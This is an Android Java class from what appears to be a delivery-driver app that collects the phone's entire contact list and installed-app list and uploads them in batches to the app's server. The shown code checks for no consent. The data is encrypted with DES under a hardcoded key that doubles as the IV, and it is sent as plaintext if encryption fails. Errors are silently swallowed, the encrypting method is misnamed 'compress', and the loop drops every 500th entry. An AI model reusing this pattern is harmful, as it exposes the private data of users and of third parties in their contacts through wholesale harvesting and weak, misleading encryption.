package cn.bluerhino.driver.model.user;

import java.security.Key;
import java.security.spec.AlgorithmParameterSpec;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import org.json.JSONArray;
import android.content.Context;
import android.util.Base64;
import cn.bluerhino.driver.ApplicationController;
import cn.bluerhino.driver.utils.DeviceInfo;
import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request.Method;
import com.android.volley.toolbox.StringRequest;
import com.bluerhino.library.network.BRURL;
import com.bluerhino.library.network.VolleySucceedListener;

public class UploadDeviceInfo{
	protected Context mContext;
	
	public UploadDeviceInfo(Context context) {
		this.mContext = context;
		
    }
	private String key = "lxn@2014";
	public static final String ALGORITHM_DES = "DES/CBC/PKCS5Padding";
	public String compress(String str){
		try{
			DESKeySpec dks = new DESKeySpec(key.getBytes());
			 
	    	SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            //key的长度不能够小于8位字节
            Key secretKey = keyFactory.generateSecret(dks);
            Cipher cipher = Cipher.getInstance(ALGORITHM_DES);
            IvParameterSpec iv = new IvParameterSpec(key.getBytes());
            AlgorithmParameterSpec paramSpec = iv;
            cipher.init(Cipher.ENCRYPT_MODE, secretKey,paramSpec);
 
            byte[] bytes = cipher.doFinal(str.getBytes());
 
 
//            return byte2hex(bytes);
            return Base64.encodeToString(bytes, Base64.DEFAULT);
           
/*			ByteArrayOutputStream out = new ByteArrayOutputStream();   
			GZIPOutputStream gzip = new GZIPOutputStream(out);   
		    gzip.write(str.getBytes("UTF-8"));   
		    gzip.close();   
		    return out.toString();  */
		}catch(Exception e){
			
		}
		return str;
	}
	
	private void upload(final String did, final String type, final String data){
		if( data.isEmpty()) return;
		final String reqdata = compress(data);
		
		DefaultRetryPolicy policy = new DefaultRetryPolicy(10 * 1000, 0, 1.0f);
		String url = BRURL.UPLOAD_DEVICE_URL;
		StringRequest request = new StringRequest(Method.POST, url,
				new VolleySucceedListener(), null){
			@Override
            protected Map<String, String> getParams() throws AuthFailureError {
				HashMap<String,String> params = new HashMap<String, String>();
				params.put("did", did);
				params.put("type", type);
				params.put("data", reqdata);
                return params;
            }
		};
	
		request.setRetryPolicy(policy);
		
		ApplicationController.getInstance().addToRequestQueue(request, "uploadContracts");
	}
	
	public void uploadContracts(){
		try{
			DeviceInfo deviceInfo = DeviceInfo.getInstance();
			final JSONArray apps = deviceInfo.getContacts(mContext);
			final String did = ApplicationController.getInstance().getDriverId();
			String data = "";
			for(int i=0; i< apps.length(); i++){
				if(i%500 == 0){
					this.upload(did, "contracts", data);
					data = "";
				}
				else{
					data +=","+apps.getString(i);
				}
			}
			this.upload(did, "contracts", data);
		}catch(Exception e){
			
		}
	}
	public void uploadApps(){
		try{
			DeviceInfo deviceInfo = DeviceInfo.getInstance();
			final JSONArray apps = deviceInfo.getApps(mContext);
			final String did = ApplicationController.getInstance().getDriverId();
			String data = "";
			for(int i=0; i< apps.length(); i++){
				if(i%500 == 0){
					this.upload(did, "apps", data);
					data = "";
				}
				else{
					data +=","+ apps.getString(i);
				}
			}
			this.upload(did, "apps", data);
		}catch(Exception e){
			
		}
	}
	
    
}